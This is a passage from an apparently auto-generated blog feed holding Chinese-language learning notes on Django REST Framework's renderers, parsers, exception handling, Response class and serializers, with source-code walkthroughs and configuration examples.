<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 在setting.py中配置REST_FRAMEWORK，完成的是全局配置，所有接口统一处理</span></span><br><span class="line"><span class="comment"># 如果只有部分接口特殊化，可以完成 - 局部配置</span></span><br><span class="line"><span class="keyword">from</span> rest_framework.renderers <span class="keyword">import</span> JSONRenderer</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test2</span><span class="params">(APIView)</span>:</span></span><br><span class="line">    <span class="comment"># 局部配置</span></span><br><span class="line">    renderer_classes = [JSONRenderer]</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(self, request, *args, **kwargs)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> Response(<span class="string">'drf get ok 2'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">post</span><span class="params">(self, request, *args, **kwargs)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> Response(<span class="string">'drf post ok 2'</span>)</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Tech</category>
      </categories>
      <tags>
        <tag>Learning Notes</tag>
        <tag>Tech</tag>
        <tag>Dev</tag>
        <tag>Backend</tag>
        <tag>Django</tag>
        <tag>Django REST Framework</tag>
        <tag>DRF</tag>
      </tags>
  </entry>
  <entry>
    <title>Django REST Framework 学习笔记（四）：解析模块 parsers</title>
    <url>/tech/drf-learning-notes-4-the-parsers-module/</url>
    <content><![CDATA[<ul>
<li>Title(EN): <em><strong>Django REST Framework Learning Notes (4): the parsers module</strong></em></li>
<li>Author: dog2</li>
</ul>
<hr />
<h1 id="基本信息">基本信息</h1>
<ul>
<li>源码：<a href="https://github.com/encode/django-rest-framework/blob/master/rest_framework/parsers.py" target="_blank" rel="noopener"><code>rest_framework.parsers</code></a></li>
<li>官方文档：<span class="exturl" data-url="aHR0cHM6Ly93d3cuZGphbmdvLXJlc3QtZnJhbWV3b3JrLm9yZy9hcGktZ3VpZGUvcGFyc2Vycy8=">API Guild - Parsers<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2RvZy0yL2hlbGxvX2RyZi90cmVlL21hc3Rlci9ubzRfZHJmX3BhcnNlcg==">本文demo代码Github<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<a id="more"></a>
<h1 id="功能">功能</h1>
<ol type="1">
<li>drf给我们提供了多种解析数据包方式的解析类
<ul>
<li>form-data</li>
<li>x-www-form-urlencoded</li>
<li>json</li>
</ul></li>
<li>我们可以通过配置来控制前台提交的哪些格式的数据后台在解析，哪些数据不解析</li>
<li>全局配置就是针对每一个视图类，局部配置就是针对指定的视图来，让它们可以按照配置规则选择性解析数据</li>
</ol>
<h1 id="源码分析">源码分析</h1>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># APIView类的dispatch方法中</span></span><br><span class="line">request = self.initialize_request(request, *args, **kwargs)  <span class="comment"># 点进去</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#准备要解析的数据</span></span><br><span class="line">parser_context=self.get_parser_context(request)   <span class="comment"># 不是重点</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 解析模块，获取解析类</span></span><br><span class="line">parsers=self.get_parsers()  <span class="comment"># 点进去</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 去类属性(局部配置) 或 配置文件(全局配置) 拿 parser_classes</span></span><br><span class="line"><span class="keyword">return</span> [parser() <span class="keyword">for</span> parser <span class="keyword">in</span> self.parser_classes]</span><br><span class="line"></span><br><span class="line"><span class="comment"># self.parser_classes为APIView类属性</span></span><br><span class="line">parser_classes = api_settings.DEFAULT_PARSER_CLASSES</span><br><span class="line"></span><br><span class="line"><span class="comment"># api_settings中的解析类</span></span><br><span class="line"><span class="string">'DEFAULT_PARSER_CLASSES'</span>: [</span><br><span class="line">        <span class="string">'rest_framework.parsers.JSONParser'</span>,       <span class="comment"># json数据包</span></span><br><span class="line">        <span class="string">'rest_framework.parsers.FormParser'</span>,       <span class="comment"># x-www-form-urlencoded数据包  </span></span><br><span class="line">        <span class="string">'rest_framework.parsers.MultiPartParser'</span>,  <span class="comment"># form-data数据包</span></span><br><span class="line">],</span><br></pre></td></tr></table></figure>
<h1 id="用法示例">用法示例</h1>
<h2 id="自定义全局配置">自定义全局配置</h2>
<p>所有视图类统一处理，在项目的<code>settings.py</code>中</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">REST_FRAMEWORK = &#123;</span><br><span class="line">    <span class="comment"># 全局解析类配置</span></span><br><span class="line">    <span class="string">'DEFAULT_PARSER_CLASSES'</span>: [</span><br><span class="line">        <span class="string">'rest_framework.parsers.JSONParser'</span>,       <span class="comment"># json数据包</span></span><br><span class="line">        <span class="string">'rest_framework.parsers.FormParser'</span>,       <span class="comment"># x-www-form-urlencoded数据包</span></span><br><span class="line">        <span class="string">'rest_framework.parsers.MultiPartParser'</span>,  <span class="comment"># form-data数据包</span></span><br><span class="line">    ],</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="自定义局部配置">自定义局部配置</h2>
<p>某一个或一些视图类单独处理，在<code>views.py</code>视图类中提供对应的类属性</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> rest_framework.parsers <span class="keyword">import</span> JSONParser</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Book</span><span class="params">(APIView)</span>:</span></span><br><span class="line">    <span class="comment"># 局部解析类配置，只要json类型的数据包才能被解析</span></span><br><span class="line">    parser_classes = [JSONParser]</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
<h2 id="测试demo">测试demo</h2>
<p>测试代码在这里：<a href="">no4_drf_parser</a></p>
<p>其中包含： - django项目 - postman测试数据包：Body标签页定义了3种格式的数据。在局部设置只能某一种或两种，则在postman其他格式传递的数据都不显示。 - json - x-www-form-urlencoded - form-data</p>
]]></content>
      <categories>
        <category>Tech</category>
      </categories>
      <tags>
        <tag>Learning Notes</tag>
        <tag>Tech</tag>
        <tag>Dev</tag>
        <tag>Backend</tag>
        <tag>Django</tag>
        <tag>Django REST Framework</tag>
        <tag>DRF</tag>
      </tags>
  </entry>
  <entry>
    <title>Django REST Framework 学习笔记（五）：异常模块 exceptions</title>
    <url>/tech/drf-learning-notes-5-the-exceptions-module/</url>
    <content><![CDATA[<ul>
<li>Title(EN): <em><strong>Django REST Framework Learning Notes (5): the exceptions module</strong></em></li>
<li>Author: dog2</li>
</ul>
<hr />
<h1 id="基本信息">基本信息</h1>
<ul>
<li>源码：<a href="https://github.com/encode/django-rest-framework/blob/master/rest_framework/exceptions.py" target="_blank" rel="noopener"><code>rest_framework.exceptions</code></a></li>
<li>官方文档：<span class="exturl" data-url="aHR0cHM6Ly93d3cuZGphbmdvLXJlc3QtZnJhbWV3b3JrLm9yZy9hcGktZ3VpZGUvZXhjZXB0aW9ucy8=">API Guild - Exceptions<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2RvZy0yL2hlbGxvX2RyZi90cmVlL21hc3Rlci9ubzVfZHJmX2V4Y2VwdGlvbg==">本文demo代码Github<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<h1 id="异常处理">异常处理</h1>
<h2 id="drf异常处理">DRF异常处理</h2>
<ol type="1">
<li>所有经过drf的<code>APIView</code>视图类产生的异常，都可以提供异常处理方案</li>
<li>drf默认提供了异常处理方案<code>rest_framework.views.exception_handler</code>，但是处理范围有限</li>
<li>drf提供的处理方案两种，处理了返回异常现象，没处理返回None(后续就是服务器抛异常给前台)</li>
</ol>
<p>通常出于一些原因我们需要自定义异常处理，而非使用DRF的默认异常。</p>
<h2 id="基于drf自定义异常处理">基于DRF自定义异常处理</h2>
<p>自定义异常处理的常见应用场景如下：</p>
<ol type="1">
<li>解决drf没有处理的异常</li>
<li>让前台得到合理的异常信息返回、隐藏异常细节而返回通用异常信息</li>
<li>后台记录异常具体信息、如将异常细节写入日志以供审计等</li>
</ol>
<a id="more"></a>
<h1 id="源码分析">源码分析</h1>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 异常模块：APIView类的dispatch方法中</span></span><br><span class="line">response = self.handle_exception(exc)  <span class="comment"># 点进去</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#自定义异常就是提供异常处理函数exception_handler,处理的目的就是让response一定有值</span></span><br><span class="line"><span class="comment">#自定义：自己写exception_handler函数，在自己的配置文件配置EXCEPTION_HANDLER指向自己的处理异常函数</span></span><br><span class="line">exception_handler = self.get_exception_handler() <span class="comment">#点进去 #获取处理异常的方法，也可以自定义异常处理方法，在settings文件中配置</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#settings中获取异常处理的方式</span></span><br><span class="line"><span class="keyword">return</span> self.settings.EXCEPTION_HANDLER</span><br><span class="line"></span><br><span class="line"><span class="comment"># APIView类属性settings</span></span><br><span class="line">settings = api_settings</span><br><span class="line"></span><br><span class="line"><span class="comment"># api_settings中定义的默认异常处理函数，又指向回了views.exception_handler函数</span></span><br><span class="line"><span class="string">'EXCEPTION_HANDLER'</span>: <span class="string">'rest_framework.views.exception_handler'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 异常处理的结果</span></span><br><span class="line"><span class="comment"># 自定义异常就是提供exception_handler异常处理函数，处理的目的就是让response一定有值</span></span><br><span class="line">response = exception_handler(exc, context)   <span class="comment">#最后发现在views中的exception_handler就是处理异常的方法</span></span><br></pre></td></tr></table></figure>
<p>从<code>dispatch中的handle_exception</code>进入，<code>get_exception_handler()</code>获得处理异常方法<code>exception_handler()</code>，在这里也可以自定义异常方法。执行<code>exception_handler()</code>获取异常处理的结果。</p>
<h1 id="用法示例">用法示例</h1>
<h2 id="自定义全局配置">自定义全局配置</h2>
<p>这是视频教程里的做法，它对于所有视图都采用自己定制的异常处理函数。</p>
<ol type="1">
<li>在项目的<code>settings.py</code>中</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 修改自己的配置文件setting.py</span></span><br><span class="line">REST_FRAMEWORK = &#123;</span><br><span class="line">    <span class="comment"># 全局配置异常模块</span></span><br><span class="line">    <span class="string">'EXCEPTION_HANDLER'</span>: <span class="string">'api.exception.exception_handler'</span>,  <span class="comment">#设置自定义异常文件路径，在api应用下创建exception文件，exception_handler函数</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ol start="2" type="1">
<li>创建自定义异常处理函数，函数内部逻辑一般为
<ol type="1">
<li>先将异常处理交给<code>rest_framework.views</code>的<code>exception_handler</code>去处理</li>
<li>判断处理的结果(返回值)<code>response</code>，有值代表drf已经处理了，<code>None</code>代表drf处理不了的异常，需要自定义去处理</li>
</ol></li>
</ol>
<p>api应用下创建处理异常文件exception.py</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 自定义异常处理文件exception，重写exception_handler函数</span></span><br><span class="line"><span class="keyword">from</span> rest_framework.views <span class="keyword">import</span> exception_handler <span class="keyword">as</span> drf_exception_handler   <span class="comment">#drf原生处理异常函数取别名 drf_exception_handler</span></span><br><span class="line"><span class="keyword">from</span> rest_framework.views <span class="keyword">import</span> Response</span><br><span class="line"><span class="keyword">from</span> rest_framework <span class="keyword">import</span> status</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exception_handler</span><span class="params">(exc, context)</span>:</span>  <span class="comment">#自定义处理异常函数</span></span><br><span class="line">    <span class="comment"># drf的exception_handler做基础处理</span></span><br><span class="line">    response = drf_exception_handler(exc, context)</span><br><span class="line">    <span class="comment"># 为空，就是drf框架处理不了的异常</span></span><br><span class="line">    <span class="keyword">if</span> response <span class="keyword">is</span> <span class="literal">None</span>: <span class="comment">#处理之后为空，再进行自定义的二次处理</span></span><br><span class="line">        <span class="comment"># print(exc)    #错误原因   还可以做更详细的原因，通过判断exc信息类型</span></span><br><span class="line">        <span class="comment"># print(context)  #错误信息</span></span><br><span class="line">        print(<span class="string">'%s - %s - %s'</span> % (context[<span class="string">'view'</span>], context[<span class="string">'request'</span>].method, exc))</span><br><span class="line">        <span class="keyword">return</span> Response(&#123;</span><br><span class="line">            <span class="string">'detail'</span>: <span class="string">'global customized exception: internal server error'</span> <span class="comment"># 全局定制异常：服务器错误</span></span><br><span class="line">        &#125;, status=status.HTTP_500_INTERNAL_SERVER_ERROR, exception=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">return</span> response     <span class="comment">#处理之后有值，就直接返回结果</span></span><br></pre></td></tr></table></figure>
<h2 id="自定义局部配置">自定义局部配置</h2>
<p>这是我拓展的方法，它可以针对某个特定的视图类，定制不同于全局定制异常的特有处理方式。</p>
<p>根据前面的源码分析中可以知道，要为视图类单独定制异常处理函数，可以这样做：</p>
<ol type="1">
<li>在继承<code>APIView</code>编写视图类时，重写父类的<code>get_exception_handler</code>函数，让异常处理函数指向自定义的异常处理函数。</li>
<li>在视图类中加入定制的异常处理函数。</li>
</ol>
<p>示例代码如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> django.views.decorators.csrf <span class="keyword">import</span> csrf_exempt</span><br><span class="line"><span class="keyword">from</span> django.utils.decorators <span class="keyword">import</span> method_decorator</span><br><span class="line"><span class="comment"># drf原生处理异常函数取别名 drf_exception_handler</span></span><br><span class="line"><span class="keyword">from</span> rest_framework.views <span class="keyword">import</span> exception_handler <span class="keyword">as</span> drf_exception_handler</span><br><span class="line"><span class="keyword">from</span> rest_framework.views <span class="keyword">import</span> Response</span><br><span class="line"><span class="keyword">from</span> rest_framework <span class="keyword">import</span> status</span><br><span class="line"></span><br><span class="line"><span class="meta">@method_decorator(csrf_exempt, name='dispatch')</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LocalExceptionView</span><span class="params">(APIView)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">post</span><span class="params">(self, request, *args, **kwargs)</span>:</span></span><br><span class="line">        print(request.query_params)</span><br><span class="line">        print(request.data)</span><br><span class="line">        print(request.not_exists) <span class="comment"># error code</span></span><br><span class="line">        <span class="keyword">return</span> Response(<span class="string">'post ok'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_exception_handler</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.exception_handler</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">exception_handler</span><span class="params">(self, exc, context)</span>:</span></span><br><span class="line">        <span class="comment"># drf的exception_handler做基础处理</span></span><br><span class="line">        response = drf_exception_handler(exc, context)</span><br><span class="line">        <span class="comment"># 为空，就是drf框架处理不了的异常</span></span><br><span class="line">        <span class="keyword">if</span> response <span class="keyword">is</span> <span class="literal">None</span>: <span class="comment">#处理之后为空，再进行自定义的二次处理</span></span><br><span class="line">            <span class="comment"># print(exc)    #错误原因   还可以做更详细的原因，通过判断exc信息类型</span></span><br><span class="line">            <span class="comment"># print(context)  #错误信息</span></span><br><span class="line">            print(<span class="string">'%s - %s - %s'</span> % (context[<span class="string">'view'</span>], context[<span class="string">'request'</span>].method, exc))</span><br><span class="line">            <span class="keyword">return</span> Response(&#123;</span><br><span class="line">                <span class="string">'detail'</span>: <span class="string">'local customized exception: internal server error'</span> <span class="comment"># 局部定制异常：服务器错误</span></span><br><span class="line">            &#125;, status=status.HTTP_500_INTERNAL_SERVER_ERROR, exception=<span class="literal">True</span>)</span><br><span class="line">        <span class="keyword">return</span> response     <span class="comment">#处理之后有值，就直接返回结果</span></span><br></pre></td></tr></table></figure>
<h2 id="测试demo">测试demo</h2>
<p>测试代码在这里：<a href="">no5_drf_exception</a></p>
<p>其中包含： - django项目 - 全局定制异常 - 局部定制异常 - postman测试数据包 - 全局定制异常测试 - 局部定制异常测试</p>
]]></content>
      <categories>
        <category>Tech</category>
      </categories>
      <tags>
        <tag>Learning Notes</tag>
        <tag>Tech</tag>
        <tag>Dev</tag>
        <tag>Backend</tag>
        <tag>Django</tag>
        <tag>Django REST Framework</tag>
        <tag>DRF</tag>
      </tags>
  </entry>
  <entry>
    <title>Django REST Framework 学习笔记（六）：响应模块 response</title>
    <url>/tech/drf-learning-notes-6-the-response-module/</url>
    <content><![CDATA[<ul>
<li>Title(EN): <em><strong>Django REST Framework Learning Notes (6): the response module</strong></em></li>
<li>Author: dog2</li>
</ul>
<hr />
<h1 id="基本信息">基本信息</h1>
<ul>
<li>源码：<a href="hhttps://github.com/encode/django-rest-framework/blob/master/rest_framework/response.py"><code>rest_framework.response</code></a></li>
<li>官方文档：<span class="exturl" data-url="aHR0cHM6Ly93d3cuZGphbmdvLXJlc3QtZnJhbWV3b3JrLm9yZy9hcGktZ3VpZGUvcmVzcG9uc2VzLw==">API Guild - Exceptions<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<a id="more"></a>
<h1 id="源码分析">源码分析</h1>
<p>响应类构造器：<code>rest_framework.response.Response</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Response</span><span class="params">(SimpleTemplateResponse)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, data=None, status=None,</span></span></span><br><span class="line"><span class="function"><span class="params">                 template_name=None, headers=None,</span></span></span><br><span class="line"><span class="function"><span class="params">                 exception=False, content_type=None)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">            :param data: 响应数据</span></span><br><span class="line"><span class="string">            :param status: http响应状态码</span></span><br><span class="line"><span class="string">            :param template_name: drf也可以渲染页面，渲染的页面模板地址（不用了解）</span></span><br><span class="line"><span class="string">            :param headers: 响应头</span></span><br><span class="line"><span class="string">            :param exception: 是否异常了</span></span><br><span class="line"><span class="string">            :param content_type: 响应的数据格式（一般不用处理，响应头中带了，且默认是json）</span></span><br><span class="line"><span class="string">        """</span></span><br></pre></td></tr></table></figure>
<h1 id="用法示例">用法示例</h1>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># status是解释一堆 数字 网络状态码的模块</span></span><br><span class="line"><span class="keyword">from</span> rest_framework <span class="keyword">import</span> status</span><br><span class="line"></span><br><span class="line"><span class="comment"># 一般情况下只需要返回数据，status和headers都有默认值</span></span><br><span class="line"><span class="keyword">return</span> Response(data=&#123;数据&#125;, status=status.HTTP_200_OK, headers=&#123;设置的响应头&#125;)</span><br></pre></td></tr></table></figure>
<h1 id="二次封装response类">二次封装Response类</h1>
<p>可以自定义APIResponse以便于使用</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> rest_framework.response <span class="keyword">import</span> Response</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">APIResponse</span><span class="params">(Response)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, data_status=<span class="number">0</span>, data_msg=<span class="string">'ok'</span>, results=None, http_status=None, headers=None, exception=False, **kwargs)</span>:</span></span><br><span class="line">        <span class="comment"># data的初始状态：状态码与状态信息</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">'status'</span>: data_status,</span><br><span class="line">            <span class="string">'msg'</span>: data_msg,</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment"># data的响应数据体</span></span><br><span class="line">        <span class="comment"># results可能是False、0等数据，这些数据某些情况下也会作为合法数据返回</span></span><br><span class="line">        <span class="keyword">if</span> results <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            data[<span class="string">'results'</span>] = results</span><br><span class="line">        <span class="comment"># data响应的其他内容</span></span><br><span class="line">        <span class="comment"># if kwargs is not None:</span></span><br><span class="line">        <span class="comment">#     for k, v in kwargs.items():</span></span><br><span class="line">        <span class="comment">#         setattr(data, k, v)</span></span><br><span class="line">        data.update(kwargs)</span><br><span class="line"></span><br><span class="line">        super().__init__(data=data, status=http_status, headers=headers, exception=exception)   <span class="comment">#重写父类Response的__init__方法</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Tech</category>
      </categories>
      <tags>
        <tag>Learning Notes</tag>
        <tag>Tech</tag>
        <tag>Dev</tag>
        <tag>Backend</tag>
        <tag>Django</tag>
        <tag>Django REST Framework</tag>
        <tag>DRF</tag>
      </tags>
  </entry>
  <entry>
    <title>Django REST Framework 学习笔记（七）：序列化模块 serialziers 之 Serialzier类</title>
    <url>/tech/drf-learning-notes-7-the-serialzier-class-in-serialziers-module/</url>
    <content><![CDATA[<ul>
<li>Title(EN): <em><strong>Django REST Framework Learning Notes (7): the Serialzier class in serialziers module</strong></em></li>
<li>Author: dog2</li>
</ul>
<hr />
<h1 id="基本信息">基本信息</h1>
<ul>
<li>源码：<a href="https://github.com/encode/django-rest-framework/blob/master/rest_framework/serializers.py" target="_blank" rel="noopener"><code>rest_framework.response</code></a></li>
<li>官方文档
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly93d3cuZGphbmdvLXJlc3QtZnJhbWV3b3JrLm9yZy9hcGktZ3VpZGUvc2VyaWFsaXplcnMv">API Guild - Serializers<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly93d3cuZGphbmdvLXJlc3QtZnJhbWV3b3JrLm9yZy9hcGktZ3VpZGUvZmllbGRzLw==">API Guild - Serializer fields<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly93d3cuZGphbmdvLXJlc3QtZnJhbWV3b3JrLm9yZy9hcGktZ3VpZGUvcmVsYXRpb25zLw==">API Guild - Serializer relations<i class="fa fa-external-link-alt"></i></span></li>
</ul></li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2RvZy0yL2hlbGxvX2RyZi90cmVlL21hc3Rlci9ubzdfZHJmX1NlcmlhbGl6ZXI=">本文demo代码Github<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p>DRF常用序列化类主要有</p>
<ul>
<li><code>rest_framework.serialziers.Serializer</code></li>
<li><code>rest_framework.serialziers.ModelSerializer</code></li>
<li><code>rest_framework.serialziers.ListSerializer</code></li>
</ul>
<p>本篇介绍<code>rest_framework.serialziers.Serializer</code></p>
<a id="more"></a>
<h1 id="源码分析">源码分析</h1>
<p>根据基类<code>rest_framework.serialziers.BaseSerializer</code>构造函数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, instance=None, data=empty, **kwargs)</span>:</span></span><br></pre></td></tr></table></figure>
<p>定义好Serialzier类后，就可以创建Serializer对象了。Serializer的构造方法为</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Serializer(instance=<span class="literal">None</span>,data=empty,**kwargs)</span><br></pre></td></tr></table></figure>
<ol type="1">
<li>用于序列化时，将模型类对象传入<code>instance</code>参数</li>
<li>用于反序列化时，将要被反序列化的数据传入<code>data</code>参数</li>
<li>除了<code>instance</code>和<code>data</code>参数外，在构造S<code>erializer</code>对象时，还可以通过<code>context</code>参数额外添加数据。通过<code>context</code>参数附加的数据，可以通过<code>Serializer</code>对象的<code>context</code>属性获取。 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">serializer = AccountSerializer(account, context=&#123;<span class="string">'request'</span>:request&#125;)</span><br></pre></td></tr></table></figure></li>
</ol>
<h1 id="用法">用法</h1>
<p>序列化器的使用分两个阶段：</p>
<ol type="1">
<li><p>在客户端请求时，使用序列化器可以完成对数据的反序列化（就是前段往后端传递数据，反序列化之后保存数据）</p></li>
<li><p>在服务器响应时，使用序列化器可以完成对数据的序列化（服务器取出数据，序列化之后往前段发送展示）</p></li>
</ol>
<h2 id="序列化">序列化</h2>
<p>序列化是将数据返回给前台。DRF的序列化使用流程如下：</p>
<ol type="1">
<li>查询出一个用户对象</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> models <span class="keyword">import</span> user</span><br><span class="line">user = User.object.get(id=<span class="number">2</span>)</span><br></pre></td></tr></table></figure>
<ol start="2" type="1">
<li>构造序列化器对象</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> user.serializers <span class="keyword">import</span> UserSerializer</span><br><span class="line">user_obj = Userserializer(user)  <span class="comment">#放入查询出的user对象</span></span><br></pre></td></tr></table></figure>
<ol start="3" type="1">
<li>获取序列化对象，通过data属性可以获取序列化后的数据</li>
</ol>
<p>上面查出来的user_ser是一个serializer对象，需要取出具体的数据传给前端，所有要用到 user_ser.data取出具体数据</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">user_ser = Userserializer(user).data</span><br></pre></td></tr></table></figure>
<ol start="4" type="1">
<li>如果要被序列化的数据是包含多条数据的（也可以说被[ ]嵌套的，<code>queryset</code>类型数据，不管是多条还是单条）,需要添加<code>many=True</code>参数</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">user = models.User.objects.all()</span><br><span class="line">user_ser =  Userserialzier(user,many=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
<ol start="5" type="1">
<li>自定义序列化属性</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">serializers.SerializerMethodField()</span><br></pre></td></tr></table></figure>
<h2 id="反序列化使用流程">反序列化使用流程</h2>
<p>反序列化是将前天传来的数据数据存入数据库。DRF的反序列化使用流程如下：</p>
<h3 id="数据验证">数据验证</h3>
<ol type="1">
<li><p>使用序列化器进行反序列化时，需要对数据进行验证后，才能获取验证成功的数据或保存成模型类对象。</p></li>
<li><p>在获取反序列化的数据前，必须调用<code>is_valid()</code>方法进行验证，验证成功返回<code>True</code>，否则返回<code>False</code>。</p></li>
<li><p>验证失败，可以通过序列化对象的<code>errors</code>属性获取错误信息，返回字典，包含了字段和字段的错误。</p></li>
<li><p>验证通过，可以通过序列化器对象的<code>validated_data</code>属性获取数据</p></li>
</ol>
<h3 id="保存数据">保存数据</h3>
<p>序列化类中必须重写<code>create</code>方法用于新增，重写<code>update</code>方法用于修改。视图中使用<code>create</code>和<code>save</code>方法。</p>
<p>从源码可知<code>save</code>方法内部调用的是序列化类中的<code>create</code>方法，所以新增必须要在序列化类中重写<code>create</code>方法。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="用法示例">用法示例</h2>
<h3 id="序列化-1">序列化</h3>
<h4 id="模型层-models.py">模型层 <code>models.py</code></h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span><span class="params">(models.Model)</span>:</span></span><br><span class="line">    SEX_CHOICES = [</span><br><span class="line">        [<span class="number">0</span>,<span class="string">'男'</span>],</span><br><span class="line">        [<span class="number">1</span>,<span class="string">'女'</span>],</span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    name = models.CharField(max_length=<span class="number">64</span>)</span><br><span class="line">    pwd = models.CharField(max_length=<span class="number">32</span>)</span><br><span class="line">    phone = models.CharField(max_length=<span class="number">11</span>,null=<span class="literal">True</span>,default=<span class="literal">None</span>)</span><br><span class="line">    sex = models.IntegerField(choices=SEX_CHOICES,default=<span class="number">0</span>)</span><br><span class="line">    icon = models.ImageField(upload_to=<span class="string">'icon'</span>,default=<span class="string">'icon/default.jpg'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Meta</span>:</span></span><br><span class="line">        db_table=<span class="string">'old_boy_user'</span></span><br><span class="line">        verbose_name=<span class="string">'用户'</span></span><br><span class="line">        verbose_name_plural=verbose_name</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__str__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">'%s'</span> %self.name</span><br></pre></td></tr></table></figure>
<h4 id="配置层-settings.py">配置层 <code>settings.py</code></h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 注册rest_framework</span></span><br><span class="line">INSTALLED_APPS = [</span><br><span class="line">    <span class="comment"># ...</span></span><br><span class="line">    <span class="string">'rest_framework'</span>,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># media资源</span></span><br><span class="line">MEDIA_URL = <span class="string">'/media/'</span>  <span class="comment"># 后期高级序列化类与视图类，会使用该配置</span></span><br><span class="line">MEDIA_ROOT = os.path.join(BASE_DIR, <span class="string">'media'</span>)  <span class="comment"># media资源路径</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 国际化配置</span></span><br><span class="line">LANGUAGE_CODE = <span class="string">'zh-hans'</span></span><br><span class="line">TIME_ZONE = <span class="string">'Asia/Shanghai'</span></span><br><span class="line">USE_I18N = <span class="literal">True</span></span><br><span class="line">USE_L10N = <span class="literal">True</span></span><br><span class="line">USE_TZ = <span class="literal">False</span></span><br></pre></td></tr></table></figure>
<h4 id="序列化层-apiserializers.py">序列化层 <code>api/serializers.py</code></h4>
<ol type="1">
<li><code>api</code>应用下创建<code>serializers.py</code>文件</li>
<li>设置需要返回给前台数据样式 那些<code>model</code>类有对应的字段，不需要返回的就不用设置了</li>
<li>设置方法字段，字段名可以随意，字段值由 <code>get_字段名</code> 提供，来完成一些需要处理在返回的数据，类似于<code>forms</code>组件</li>
</ol>
